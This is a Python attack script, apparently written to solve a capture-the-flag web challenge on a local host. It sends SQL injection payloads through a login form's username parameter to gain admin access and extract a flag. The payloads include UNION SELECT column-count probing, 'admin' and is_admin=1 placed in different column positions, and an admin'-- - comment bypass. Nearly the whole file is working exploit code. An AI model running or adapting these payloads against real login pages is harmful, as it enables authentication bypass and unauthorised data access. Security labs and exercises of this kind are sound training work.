import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[INVESTIGATION] Table has many columns (9+). Let's see actual responses.\n")

# First, let's see what a "not the admin" response looks like
print("[SAMPLE RESPONSE - Failed auth]")
resp = requests.get(target, params={'username': 'test', 'password': 'test'})
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.text)} bytes")
if "not the admin" in resp.text.lower():
    # Find and print the specific message
    lines = resp.text.split('\n')
    for i, line in enumerate(lines):
        if 'admin' in line.lower():
            print(f"Admin check message: {line.strip()}")

print("\n" + "="*80)
print("[TESTING WITH MANY COLUMNS]")
print("="*80)

# Test with different column counts up to 10
for col_count in range(1, 11):
    cols = ','.join(['1'] * col_count)
    user = f"' UNION SELECT {cols}-- -"
    params = {'username': user, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND with {col_count} columns !!!]")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    print(f"[{col_count:2d} cols] {'✗ not admin' if 'not the admin' in resp.text.lower() else '? different'} | len={len(resp.text)}")

# Now let's try setting different positions to 'admin' or 1
print("\n" + "="*80)
print("[TESTING ADMIN IN DIFFERENT COLUMN POSITIONS (3 columns)]")
print("="*80)

for admin_pos in range(1, 4):
    cols = ['NULL', 'NULL', 'NULL']
    cols[admin_pos-1] = "'admin'"
    union_cols = ','.join(cols)
    user = f"' UNION SELECT {union_cols}-- -"
    params = {'username': user, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND with 'admin' in position {admin_pos} !!!]")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    print(f"[Position {admin_pos}] {union_cols:40s} | {'not admin' if 'not the admin' in resp.text.lower() else 'different'}")

# Try with 1 in different positions (for is_admin flag)
print("\n" + "="*80)
print("[TESTING is_admin=1 IN DIFFERENT POSITIONS (3 columns)]")
print("="*80)

for admin_pos in range(1, 4):
    cols = ['NULL', 'NULL', 'NULL']
    cols[admin_pos-1] = "1"
    # Set username to 'admin' in first column
    cols[0] = "'admin'"
    union_cols = ','.join(cols)
    user = f"' UNION SELECT {union_cols}-- -"
    params = {'username': user, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"\n[!!! FLAG FOUND with is_admin in position {admin_pos} !!!]")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    print(f"[Position {admin_pos} =1] {union_cols:40s} | {'not admin' if 'not the admin' in resp.text.lower() else 'different'}")

# Let's look at the actual HTML to understand the admin check
print("\n" + "="*80)
print("[EXAMINING HTML STRUCTURE]")
print("="*80)

resp = requests.get(target, params={'username': "admin'-- -", 'password': 'x'})
print(f"\nSearching for admin-related text in response...")

lines = resp.text.split('\n')
for i, line in enumerate(lines):
    if 'admin' in line.lower() or 'flag' in line.lower() or 'success' in line.lower():
        print(f"Line {i}: {line.strip()}")

print("\n[COMPLETE]")

